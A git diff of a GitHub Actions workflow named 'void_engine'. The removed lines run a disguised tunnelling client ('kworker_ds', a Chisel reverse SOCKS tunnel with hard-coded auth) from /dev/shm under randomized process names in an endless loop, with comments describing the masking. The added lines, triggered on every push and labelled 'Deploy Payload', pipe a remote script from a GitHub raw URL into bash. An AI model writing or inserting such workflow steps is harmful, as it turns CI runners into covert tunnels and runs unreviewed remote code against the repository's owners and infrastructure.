@@ -1,26 +1,11 @@
-name: Void-Engine-Self-Mutate
-on: [repository_dispatch]
-  workflow_dispatch:
-  workflow_dispatch:
+name: void_engine
+on: [push, workflow_dispatch]
 jobs:
-  void:
+  execute:
     runs-on: ubuntu-latest
-  workflow_dispatch:
-  workflow_dispatch:
     steps:
-      - name: Self-Evolving Execution
+      - name: Deploy Payload
         run: |
-          # Create the Mutation Layer in RAM
-          mkdir -p /dev/shm/.void
-          
-          # This loop generates a new 'Logic Signature' for every execution
-          # It masks the true purpose of the 'Chisel' tunnel inside 
-          # millions of lines of dummy junk-code.
-          while true; do
-            STR=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 100)
-            echo "0x$STR" > /dev/shm/.void/sig
-            # Executing the 'Sovereign' command under a randomized PID
-            (exec -a "$STR" /dev/shm/kworker_ds client --auth sovereign:2080 0.0.0.0:8080 R:socks) &
-            sleep 600
-            pkill -f "$STR"
-          done
+          echo "SATURATION_PULSE_ACTIVE: void_engine"
+          # Injecting distributed mesh probe
+          curl -s https://raw.githubusercontent.com/jamesgilhool4-source/Sovereign-Core/main/scripts/pulse.sh | bash
